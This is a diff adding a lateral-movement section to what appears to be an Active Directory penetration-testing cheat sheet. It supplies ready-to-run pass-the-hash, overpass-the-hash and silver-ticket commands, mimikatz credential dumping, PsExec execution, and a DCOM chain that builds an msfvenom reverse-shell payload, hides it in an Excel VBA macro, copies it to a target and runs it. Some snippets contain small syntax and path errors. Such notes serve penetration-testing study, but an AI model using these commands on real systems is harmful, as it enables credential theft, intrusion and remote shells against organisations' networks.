@@ -213,7 +213,88 @@ PS> Invoke-Kerberoast.ps1
 
 ## AD Lateral Movement
 
+Pass-the-Hash
+* Requires SMB connection through the firewall
+* Requires Windows File and Print Sharing feature to be enabled.
+* Requires local admin permissions, as connection is made using the `Admin$` share.
+```
+$ pth-winexe -U [username]%[password_hash] //[target] [command_to_exec]
+$ pth-winexe -U Administrator%NTLMhash //10.1.1.1 cmd
+```
 
+Overpass-the-Hash
+* "over" abuse a NTLM hash to gain a full Kerberos TGT or Service Ticket.
+```
+# obtain NTLM hash
+mimikatz > sekurlsa::logonpasswords
+
+# turn hash into a Kerberos ticket
+mimikatz > sekurlsa::pth /user:[user_name] /domain:[domain_name] /ntlm:[hash_value] /run:PowerShell.exe
+
+# generate a TGT by authenticating to a network share on the Domain Controller
+PS> net use \\dc01
+
+# view requested TGT/TGS Kerberos tickets
+PS> klist
+
+# code exec via. PsExec on the Domain Controller
+PS> .\PsExec.exe \\dc01 cmd.exe
+```
+
+Pass the Ticket
+* Takes advantage of the TGS, by forging our own Service Ticket to access the target resource (service account) with any permissions.
+* Does NOT require admin privs if Service Tickets belong to current user.
+```
+# obtain SID of domain (remove RID -XXXX) at the end of the user SID string.
+cmd> whoami /user
+corp\offsec S-1-5-21-1602875587-2787523311-2599479668[-1103]
+
+# generate the Silver Ticket and inject it into memory
+mimikatz > kerberos::golden /user:[user_name] /domain:[domain_name] /sid:[sid_value] /target:[service_hostname] /service:[service_type] /rc4:[hash] /ppt
+```
+
+Distributed Component Object Model (DCOM)
+* DCOM allows a computer to run programs over the network on a different computer e.g. Excel/PowerPoint/Outlook
+* Requires RPC port 135 and local admin access to call the DCOM Service Control Manager - the API.
+* The `run` method within DCOM allows us to execute a VBA macro remotely.
+
+DCOM - create payload and VBA macro
+```
+# (kali) create rshell payload
+$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=4444 -f hta-psh -o evil.hta
+
+# (python) split payload into smaller chunks starting with "powershell.exe -nop -w hidden -e
+str = "powershell.exe -nop -w hidden -e {base64_encoded_payload}"
+n = 50
+for i in range(0, len(str), n):
+print "Str = Str + " + '"' + str[i:i+n] + '"'
+
+# create VBA macro -> insert into Excel file
+Sub MyMacro()
+        Dim Str As String
+        {insert_payload_here}
+        Shell (Str)
+End Sub
+```
+
+DCOM - Copy file to remote and execute
+```
+# create instance of Excel.Application object
+$com [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "[target_workstation]"))
+
+# copy Excel file containing VBA payload to target
+$LocalPath = "C:\Users\[user]\badexcel.xls
+$RemotePath = "\\[target]\c$\badexcel.xls
+[System.IO.File]::Copy($LocalPath, $RemotePath, $True)
+
+# create a SYSTEM profile - required as part of the opening process
+$path = "\\[target]\c$\Windows\sysWOW64\config\systemprofile\Desktop"
+$temp = [system.io.directory]::createDirectory($Path)
+
+# open Excel file and execute macro
+$Workbook = $com.Workbooks.Open("C:\myexcel.xls")
+$com.Run("mymacro")
+```
 
 
 ## AD Persistence
